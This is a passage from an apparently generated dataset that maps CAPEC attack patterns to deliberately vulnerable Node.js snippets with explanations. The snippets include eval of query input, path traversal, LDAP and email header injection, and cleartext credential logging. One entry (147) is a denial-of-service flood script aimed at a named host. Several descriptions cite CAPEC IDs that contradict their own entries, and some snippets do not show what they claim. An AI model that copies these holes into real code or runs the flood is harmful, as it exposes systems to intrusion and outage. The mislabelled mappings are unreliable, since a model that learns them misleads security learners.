        "description": "This JavaScript code snippet simulates a scenario where an attacker tries to invoke all common switches and options in a target application to discover weaknesses. The code processes command-line arguments and checks them against a list of known options and hidden options. If a hidden option like '--debug' or '--admin' is invoked, it reveals sensitive information or grants unauthorized access, respectively. This demonstrates the CAPEC concept of 'Try All Common Switches' by indiscriminately attempting to invoke options, and it highlights related CWEs such as hidden functionality (CWE-912) and incomplete list of disallowed inputs (CWE-184)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "const sendEmail = (to, subject, body) => {\n  const emailHeaders = `To: ${to}\\nSubject: ${subject}\\n\\n`;\n  const emailContent = emailHeaders + body;\n  // Simulate sending email\n  console.log('Sending email:', emailContent);\n};\n\n// Example usage\nconst userInput = 'attacker@example.com\\nBCC: victim@example.com';\nsendEmail(userInput, 'Hello', 'This is a test email.');",
        "description": "This JavaScript code snippet demonstrates an email injection vulnerability. The `sendEmail` function constructs an email message by concatenating user-provided input directly into the email headers. The `userInput` variable simulates an attacker's input, which includes a newline character to inject additional headers (BCC in this case). This code does not properly neutralize special characters (like newline characters) in the input, leading to potential email header manipulation. This example embodies the main idea of CAPEC-138 (Email Injection) and is related to several CWEs, including CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences), CWE-116 (Improper Encoding or Escaping of Output), and CWE-147 (Improper Neutralization of Input Terminators)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.substring(1); // Get user input from URL path\n  let responseMessage = `Hello, ${userInput}`; // Use user input in format string\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(responseMessage); // Send response to client\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server extracts user input from the URL path and incorporates it directly into a response message using a template string. This demonstrates a format string injection vulnerability (CAPEC-135) because the user input is not validated or sanitized (CWE-20, CWE-1286). An attacker could potentially manipulate the input to include special characters or formatting sequences that could lead to unexpected behavior or security issues (CWE-74, CWE-134)."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "const ldap = require('ldapjs');\nconst client = ldap.createClient({ url: 'ldap://localhost:389' });\n\nfunction authenticate(username, password) {\n  const base = 'dc=example,dc=com';\n  const filter = `(uid=${username})`;\n  const opts = {\n    filter: filter,\n    scope: 'sub'\n  };\n\n  client.search(base, opts, (err, res) => {\n    if (err) {\n      console.error('LDAP search error:', err);\n      return;\n    }\n\n    res.on('searchEntry', (entry) => {\n      console.log('User found:', entry.object);\n      // Here you would typically bind with the user's DN and password to authenticate\n    });\n\n    res.on('error', (err) => {\n      console.error('LDAP search error:', err);\n    });\n  });\n}\n\nauthenticate('*', 'password');",
        "description": "This JavaScript code snippet demonstrates a vulnerable LDAP query that is susceptible to LDAP Injection. The `authenticate` function constructs an LDAP query using user-provided input for the `username` parameter without proper input validation or neutralization of special characters. This allows an attacker to manipulate the LDAP query by injecting special characters, such as '*', which can return information about all users in the LDAP directory. The code highlights the importance of proper input validation and neutralization to prevent LDAP Injection attacks, as described in CAPEC-90 and related CWEs."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const query = require('url').parse(req.url, true).query;\n  const userInput = query.userInput;\n\n  // Vulnerable code: directly using user input in a GET request\n  const options = {\n    hostname: 'example.com',\n    path: `/search?query=${userInput}`,\n    method: 'GET'\n  };\n\n  const request = http.request(options, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  });\n\n  request.on('error', (e) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Problem with request: ${e.message}`);\n  });\n\n  request.end();\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming requests. It extracts a user-provided input from the query string and uses it directly in constructing a new HTTP GET request to another server. This is vulnerable to parameter injection attacks, as an attacker can manipulate the 'userInput' parameter to inject additional parameters or modify the request. For example, if the user input is 'test&new_param=value', the resulting request path will be '/search?query=test&new_param=value', potentially altering the server's behavior. This code demonstrates the CAPEC concept of parameter injection and highlights related CWEs such as improper neutralization of argument delimiters (CWE-88), improper encoding or escaping of output (CWE-116), and use of GET request method with sensitive query strings (CWE-598)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const urlParams = new URLSearchParams(req.url.split('?')[1]);\n  const className = urlParams.get('class');\n  const methodName = urlParams.get('method');\n\n  try {\n    const ClassRef = require(`./${className}`);\n    const instance = new ClassRef();\n    const result = instance[methodName]();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Result: ${result}`);\n  } catch (error) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error occurred');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that uses reflection to dynamically load and invoke methods from classes based on URL parameters. The server extracts 'class' and 'method' parameters from the URL, then attempts to load the specified class and invoke the specified method. This embodies the main idea of CAPEC-470 (Reflection Injection) by allowing external input to control which classes and methods are used. The code is vulnerable to several related CWEs: CWE-470 (Unsafe Reflection) as it does not validate the class or method names, CWE-77 (Command Injection) and CWE-94 (Code Injection) as it allows potentially malicious input to influence the code execution, and CWE-74 (Injection) as it does not neutralize special elements in the input."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. The 'filePath' is constructed using 'path.join' with '__dirname', 'public', and 'req.url'. However, this code is vulnerable to a Relative Path Traversal attack because it does not properly validate or sanitize the 'req.url' input. An attacker could exploit this by sending a request with a URL containing sequences like '../' to access files outside the 'public' directory, potentially exposing sensitive information or system files. This embodies the main idea of the CAPEC and related CWEs by demonstrating how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "const forms = ['form1', 'form2', 'form3'];\nlet currentFormIndex = 0;\n\nfunction navigateToForm(formName) {\n  const formIndex = forms.indexOf(formName);\n  if (formIndex === -1 || formIndex > currentFormIndex) {\n    console.log('Unauthorized form access attempt detected.');\n    return;\n  }\n  currentFormIndex = formIndex;\n  console.log(`Navigated to ${formName}`);\n}\n\n// Simulate user navigating to forms\nnavigateToForm('form1'); // Valid\nnavigateToForm('form3'); // Invalid, bypassing form2\nnavigateToForm('form2'); // Valid after form1",
        "description": "This JavaScript code snippet simulates a sequence of web forms that a user must navigate through in order. The `forms` array holds the names of the forms in the required order. The `currentFormIndex` variable keeps track of the user's progress. The `navigateToForm` function checks if the user is trying to access a form out of sequence. If the user attempts to skip forms (e.g., going directly to 'form3' from 'form1'), the function logs an unauthorized access attempt. This code embodies the main idea of CAPEC-111 by demonstrating how an attacker might try to bypass intermediate forms, and it incorporates CWE-372 (Incomplete Internal State Distinction) by ensuring the application correctly tracks the current form state, CWE-472 (External Control of Assumed-Immutable Web Parameter) by validating the form name, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) by not relying solely on user input for navigation decisions."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "const cache = {}; // Simulated cache\n\nfunction fetchData(url) {\n  if (cache[url]) {\n    return cache[url]; // Return cached data\n  }\n  // Simulate fetching data from a less trusted source\n  const data = fetchFromLessTrustedSource(url);\n  cache[url] = data; // Store in cache without verification\n  return data;\n}\n\nfunction fetchFromLessTrustedSource(url) {\n  // Simulate fetching data from an untrusted source\n  return 'untrusted data';\n}\n\n// Example usage\nconst data = fetchData('http://example.com');\nconsole.log(data);",
        "description": "This JavaScript code snippet demonstrates a basic cache poisoning vulnerability. The `fetchData` function first checks if the requested URL's data is already in the cache. If it is, it returns the cached data. If not, it fetches the data from a less trusted source using the `fetchFromLessTrustedSource` function and stores it in the cache without any verification. This can lead to cache poisoning, where an attacker can manipulate the cache to store incorrect or harmful data. The code embodies the main idea of CAPEC-153 (Cache Poisoning) and highlights related CWEs such as CWE-348 (Use of Less Trusted Source), CWE-345 (Insufficient Verification of Data Authenticity), and CWE-346 (Origin Validation Error)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "const dns = require('dns');\n\nfunction resolveDomain(domain) {\n  dns.resolve(domain, (err, addresses) => {\n    if (err) throw err;\n    console.log(`IP addresses for ${domain}: ${addresses}`);\n    // Simulate using the resolved IP address for a security-critical action\n    performSecurityCriticalAction(addresses[0]);\n  });\n}\n\nfunction performSecurityCriticalAction(ip) {\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) throw err;\n    console.log(`Hostnames for IP ${ip}: ${hostnames}`);\n    // Security decision based on reverse DNS resolution\n    if (hostnames.includes('trusted.example.com')) {\n      console.log('Performing security-critical action');\n    } else {\n      console.log('IP address does not match trusted hostname');\n    }\n  });\n}\n\nresolveDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS resolution process that is vulnerable to DNS cache poisoning. The `resolveDomain` function resolves a domain name to its IP address and then uses that IP address in a security-critical action. The `performSecurityCriticalAction` function performs a reverse DNS lookup on the IP address and makes a security decision based on the hostname. This code is vulnerable because it relies on DNS and reverse DNS resolution without verifying the authenticity of the data, making it susceptible to attacks where an adversary can poison the DNS cache to redirect traffic to malicious IP addresses. This embodies the main idea of CAPEC-139 (DNS Cache Poisoning) and highlights related CWEs such as CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) and CWE-346 (Origin Validation Error)."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads and serves files based on the URL requested by the client. The code does not implement any access control mechanisms, meaning any file under the server's root directory can be accessed directly by specifying the correct URL. This embodies the main idea of the CAPEC 'Detect Unpublicized Web Pages' by allowing an adversary to access unpublicized or sensitive files. The code also touches on related CWEs: CWE-425 (Direct Request), CWE-219 (Storage of File with Sensitive Data Under Web Root), and CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere) by not restricting access to files and potentially exposing sensitive data."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Unpublicized web service\napp.get('/admin/secret', (req, res) => {\n  res.send('This is a secret admin page.');\n});\n\n// Public web service\napp.get('/public', (req, res) => {\n  res.send('This is a public page.');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two endpoints: one public and one unpublicized. The '/admin/secret' endpoint represents an unpublicized web service that could be discovered by an adversary through forced browsing (CWE-425). The '/public' endpoint is a regular public service. The unpublicized endpoint does not have any authorization checks, making it vulnerable to unauthorized access. This example embodies the main idea of CAPEC-170, where an adversary searches for unpublicized web services that may lack adequate security controls."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "const crypto = require('crypto');\n\nfunction calculateChecksum(message) {\n  return crypto.createHash('md5').update(message).digest('hex');\n}\n\nfunction sendMessage(message) {\n  const checksum = calculateChecksum(message);\n  // Simulate sending message and checksum\n  return { message, checksum };\n}\n\nfunction receiveMessage(packet) {\n  const { message, checksum } = packet;\n  const calculatedChecksum = calculateChecksum(message);\n  if (calculatedChecksum !== checksum) {\n    console.log('Message integrity check failed. Possible tampering detected.');\n  } else {\n    console.log('Message received successfully.');\n  }\n}\n\n// Simulate an attacker modifying the message and spoofing the checksum\nconst originalPacket = sendMessage('Hello, World!');\nconst tamperedPacket = { message: 'Hello, Hacker!', checksum: calculateChecksum('Hello, Hacker!') };\n\n// Receiver checks the integrity of the original and tampered messages\nreceiveMessage(originalPacket); // Should pass\nreceiveMessage(tamperedPacket); // Should pass due to spoofed checksum",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a checksum to make a tampered message appear valid. The `calculateChecksum` function uses the MD5 hash algorithm to generate a checksum for a given message. The `sendMessage` function simulates sending a message along with its checksum. The `receiveMessage` function checks the integrity of the received message by recalculating the checksum and comparing it with the received checksum. The code then simulates an attacker modifying the message and generating a new checksum to match the tampered message. Both the original and tampered messages pass the integrity check, illustrating the vulnerability described in the CAPEC. This example highlights the importance of using strong hash functions and proper validation mechanisms to ensure message integrity."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-schema', (req, res) => {\n  const schemaPath = './schemas/userSchema.xsd';\n  const userSchema = req.body.schema;\n\n  // CWE-15: External Control of System or Configuration Setting\n  fs.writeFileSync(schemaPath, userSchema);\n\n  res.send('Schema uploaded successfully');\n});\n\napp.post('/validate-xml', (req, res) => {\n  const xmlData = req.body.xml;\n  const schemaPath = './schemas/userSchema.xsd';\n\n  // CWE-112: Missing XML Validation\n  const parser = new xml2js.Parser({ schema: schemaPath });\n  parser.parseString(xmlData, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n    } else {\n      res.send('XML is valid');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js server that allows users to upload an XML schema and validate XML data against it. The '/upload-schema' endpoint accepts a schema from the user and writes it to the filesystem, representing CWE-15 (External Control of System or Configuration Setting). The '/validate-xml' endpoint attempts to validate incoming XML data against the uploaded schema but does not perform proper validation of the schema itself, representing CWE-112 (Missing XML Validation). This setup embodies the main idea of CAPEC-170 (XML Schema Poisoning), where an adversary can corrupt or modify the XML schema to undermine the security of the application."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "const http = require('http');\nconst xmlPayload = '<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://www.example.com/webservice\"><soapenv:Header/><soapenv:Body><web:ping/></soapenv:Body></soapenv:Envelope>';\n\nfunction sendRequest() {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: '/webservice',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'text/xml',\n      'Content-Length': Buffer.byteLength(xmlPayload)\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  });\n\n  req.on('error', (e) => {});\n  req.write(xmlPayload);\n  req.end();\n}\n\nsetInterval(sendRequest, 10);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of an 'XML Ping of the Death' attack. The code repeatedly sends a small SOAP XML message to a target server at a rapid rate, aiming to deplete the server's resources and potentially cause a denial of service. The payload is a simple SOAP request, and the `setInterval` function ensures that the request is sent every 10 milliseconds. This attack leverages CWE-400 (Uncontrolled Resource Consumption) by overwhelming the server with requests, CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of requests, and CWE-112 (Missing XML Validation) by assuming the server does not properly validate the incoming XML."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userContent = queryObject.content;\n\n  // CWE-345: Insufficient Verification of Data Authenticity\n  if (!userContent) {\n    res.writeHead(400, {'Content-Type': 'text/html'});\n    res.end('Invalid content');\n    return;\n  }\n\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  // No integrity check on userContent\n\n  // CWE-433: Unparsed Raw Web Content Delivery\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<div>${userContent}</div>`);\n\n  // CWE-352: Cross-Site Request Forgery (CSRF)\n  // No CSRF token validation\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  // No validation on the destination of the content\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server accepts user input via query parameters and directly injects this input into the web page without any validation or sanitization. This embodies the concept of Content Spoofing (CAPEC-139) by allowing an adversary to modify the content displayed on the web page. The code demonstrates several related CWEs: CWE-345 (Insufficient Verification of Data Authenticity) by not verifying the authenticity of the user input, CWE-924 (Improper Enforcement of Message Integrity During Transmission) by not ensuring the integrity of the user input, CWE-433 (Unparsed Raw Web Content Delivery) by delivering raw user content, CWE-352 (Cross-Site Request Forgery) by not validating CSRF tokens, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not validating the destination of the content. This can lead to various security issues such as malware exposure, financial fraud, and privacy violations."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\n\nfunction createTempFile(data) {\n  const tempDir = os.tmpdir();\n  const tempFileName = `tempfile_${Date.now()}.txt`;\n  const tempFilePath = path.join(tempDir, tempFileName);\n\n  fs.writeFileSync(tempFilePath, data);\n  console.log(`Temporary file created at: ${tempFilePath}`);\n\n  return tempFilePath;\n}\n\n// Example usage\nconst tempFilePath = createTempFile('Sensitive data');\nconsole.log(`File path: ${tempFilePath}`);",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file with a predictable name in the system's temporary directory. The `createTempFile` function generates a temporary file name using the current timestamp and writes the provided data to this file. The file is created in the system's temporary directory, which is obtained using `os.tmpdir()`. This approach embodies the main idea of CAPEC-61, 'Explore for Predictable Temporary File Names', as it creates a temporary file with a predictable name that an attacker could potentially guess. The code also touches on related CWEs, such as CWE-377 (Insecure Temporary File) and CWE-379 (Creation of Temporary File in Directory with Insecure Permissions), by not setting secure permissions or using secure methods for temporary file creation."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Vulnerable code: Exposing sensitive configuration file\nconst configFilePath = path.join('/etc', 'config.json');\n\n// Read the configuration file\nfs.readFile(configFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading the config file:', err);\n    return;\n  }\n  console.log('Config file contents:', data);\n});\n\n// Improper zeroization of sensitive data\nlet sensitiveData = 'super_secret_key';\nconsole.log('Sensitive Data:', sensitiveData);\nsensitiveData = null; // Incorrectly zeroizing sensitive data\n\n// Sensitive information exposure due to uncleared debug information\nlet debugInfo = 'Debug mode enabled with key: super_secret_key';\nconsole.log(debugInfo);\ndebugInfo = null; // Sensitive data not properly cleared\n\n// Improper scrubbing of sensitive data from decommissioned device\nfunction decommissionDevice() {\n  let sensitiveData = 'device_secret_key';\n  console.log('Decommissioning device with key:', sensitiveData);\n  // Missing proper scrubbing of sensitive data\n}\ndecommissionDevice();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Collect Data from Common Resource Locations' and the associated CWEs. The code reads a sensitive configuration file from a well-known location (/etc/config.json), making it accessible to unauthorized actors (CWE-552). It also shows improper zeroization of sensitive data (CWE-1239) by setting a variable to null instead of securely erasing it. Additionally, it exposes sensitive information due to uncleared debug information (CWE-1258) and fails to properly scrub sensitive data when decommissioning a device (CWE-1266). These vulnerabilities highlight the risks of storing and managing sensitive data in predictable locations and not properly handling sensitive information."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "const users = { 'admin': 'password123' }; \n\nfunction login(username, password) { \n  if (users[username] && users[username] === password) { \n    console.log('Login successful!'); \n    return true; \n  } else { \n    console.log('Login failed!'); \n    return false; \n  } \n} \n\n// Simulating an identity spoofing attack \nconst spoofedUsername = 'admin'; \nconst spoofedPassword = 'password123'; \nlogin(spoofedUsername, spoofedPassword);",
        "description": "This JavaScript code snippet demonstrates a simple login function that checks a hardcoded username and password. The 'users' object stores user credentials, and the 'login' function verifies the provided username and password against this object. The code simulates an identity spoofing attack by using the correct credentials for the 'admin' user. This example embodies the main idea of Identity Spoofing (CAPEC-151) and highlights related weaknesses such as Improper Authentication (CWE-287), Authentication Bypass by Spoofing (CWE-290), and Weak Authentication (CWE-1390). The hardcoded credentials and lack of proper authentication mechanisms make it easy for an attacker to spoof the identity of the 'admin' user."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // Improper Input Validation (CWE-20)\n    if (input.includes('<script>')) {\n        console.log('Invalid input');\n        return;\n    }\n    // Reliance on Untrusted Inputs in a Security Decision (CWE-807)\n    if (input === 'admin') {\n        console.log('Access granted');\n    } else {\n        console.log('Access denied');\n    }\n}\n\n// Example usage\nprocessUserInput('<script>alert(\"XSS\")</script>'); // Should be denied but only checks for <script>\nprocessUserInput('admin'); // Grants access based on untrusted input",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to improper input validation and reliance on untrusted inputs in security decisions. The function `processUserInput` checks if the input contains the string '<script>' to prevent XSS attacks, but this validation is insufficient and can be easily bypassed with other forms of malicious input. Additionally, the function grants access based on the input value 'admin', which can be manipulated by an attacker. This code embodies the main idea of CAPEC-137 (Input Data Manipulation) by showing how an attacker can exploit weaknesses in input validation to impact the security of the target."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "const fetchResource = (url) => {\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const resourceUrl = url || 'http://trusted-resource.com/data';\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!resourceUrl.startsWith('http://trusted-resource.com')) {\n    console.error('Untrusted resource URL detected!');\n    return;\n  }\n  \n  fetch(resourceUrl)\n    .then(response => {\n      if (!response.ok) {\n        throw new Error('Network response was not ok');\n      }\n      return response.json();\n    })\n    .then(data => {\n      // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n      document.getElementById('data-display').innerText = JSON.stringify(data);\n    })\n    .catch(error => {\n      console.error('Fetch error:', error);\n    });\n};\n\n// Example usage\nfetchResource('http://malicious-site.com/data');",
        "description": "This JavaScript code snippet demonstrates a scenario where an application fetches a resource from a specified URL. The code includes several vulnerabilities related to the CAPEC 'Resource Location Spoofing'.\n\n1. CWE-941: The `resourceUrl` is set to a default trusted URL if no URL is provided, but it can be overridden by an untrusted URL.\n2. CWE-940: The code attempts to verify the source of the URL, but the check is simplistic and can be bypassed if the URL starts with 'http://trusted-resource.com'.\n3. CWE-451: The fetched data is directly displayed in the UI without proper validation, which can mislead the user if the data is from a spoofed source.\n\nThis code snippet embodies the main idea of the CAPEC by showing how an adversary can deceive the application into fetching a resource from an unintended location, potentially leading to malicious outcomes."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Directory for temporary files\nconst tempDir = path.join(__dirname, 'temp');\n\n// Ensure the temp directory exists\nif (!fs.existsSync(tempDir)) {\n  fs.mkdirSync(tempDir);\n}\n\n// Create a temporary file with insecure permissions\nconst tempFilePath = path.join(tempDir, 'tempFile.txt');\nfs.writeFileSync(tempFilePath, 'Sensitive Information', { mode: 0o666 }); // Insecure permissions\n\n// Simulate reading the temporary file\nconst tempFileContent = fs.readFileSync(tempFilePath, 'utf8');\nconsole.log('Temporary file content:', tempFileContent);\n\n// Clean up the temporary file\nfs.unlinkSync(tempFilePath);",
        "description": "This JavaScript code snippet demonstrates the creation and use of a temporary file with insecure permissions, embodying the main idea of CAPEC- Screen Temporary Files for Sensitive Information. The code creates a temporary directory and a temporary file within it, storing sensitive information with insecure permissions (mode 0o666). This makes the file readable and writable by any user, representing CWE-377 (Insecure Temporary File) and CWE-378 (Creation of Temporary File With Insecure Permissions). The code then reads the content of the temporary file and prints it to the console, simulating an adversary's ability to access sensitive information. Finally, the temporary file is deleted. This example highlights the risk of storing sensitive information in temporary files without proper security measures."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Vulnerable: Collecting data in cleartext\n    });\n    req.on('end', () => {\n      console.log('Received credentials:', body); // Vulnerable: Logging sensitive data\n      res.end('Login successful');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it collects the data in cleartext and logs it to the console. This embodies the main idea of a Sniffing Attack (CAPEC-156) by demonstrating how sensitive information (e.g., login credentials) can be transmitted in cleartext (CWE-319) and intercepted by an adversary. The code also highlights the lack of encryption (CWE-311) and improper protection of sensitive data during transmission. This makes it vulnerable to sniffing attacks, where an attacker can passively observe and capture the transmitted data."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Vulnerable: Collecting data in cleartext\n    });\n    req.on('end', () => {\n      const credentials = JSON.parse(body);\n      // Vulnerable: Logging sensitive information\n      console.log(`Username: ${credentials.username}, Password: ${credentials.password}`);\n      res.end('Login successful');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it collects the request body data in cleartext and logs the sensitive information (username and password) to the console. This embodies the main idea of the CAPEC 'Sniffing Network Traffic' by demonstrating how sensitive information can be transmitted in cleartext (CWE-319) and logged without encryption (CWE-311), making it susceptible to network sniffing attacks. The code also highlights the potential for exposure of sensitive system information (CWE-497) and the risk of capture-replay attacks (CWE-294) if the data were to be intercepted and reused."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User input for library path\nlet userLibraryPath = process.argv[2];\n\n// Vulnerable code: using user-supplied path to require a library\ntry {\n  let library = require(path.resolve(userLibraryPath));\n  library.execute();\n} catch (err) {\n  console.error('Error loading library:', err);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application uses a user-supplied path to load an external library. The `userLibraryPath` is taken from command-line arguments, which can be controlled by an attacker. The `require` function is then used to load the library from the provided path. This can lead to the execution of malicious code if the attacker supplies a path to a malicious library. This snippet embodies the main idea of the CAPEC 'Redirect Access to Libraries' by showing how an adversary can manipulate the execution flow to point to an adversary-supplied library. The related CWEs are represented as follows: CWE-426 (Untrusted Search Path) and CWE-73 (External Control of File Name or Path) are demonstrated by the use of an externally-supplied path to load a library, and CWE-427 (Uncontrolled Search Path Element) is shown by the lack of control over the search path used to find the library."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const script = queryObject.script;\n\n  if (script) {\n    try {\n      eval(script); // CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/html'});\n      res.end(`<h1>Error</h1><p>${e.message}</p>`); // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n    }\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end('<h1>Welcome</h1><p>No script provided</p>');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL query parameters to extract a 'script' parameter. If a script is provided, it attempts to execute the script using the 'eval' function. This is a direct example of CWE-79 (Cross-site Scripting) as it does not neutralize user input before execution. If an error occurs during script execution, the error message is sent back to the client without proper neutralization, demonstrating CWE-81 (Improper Neutralization of Script in an Error Message Web Page). This code embodies the main idea of CAPEC-111 (Exploit Script-Based APIs) by allowing an attacker to inject and execute arbitrary scripts, potentially compromising the server or client application."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
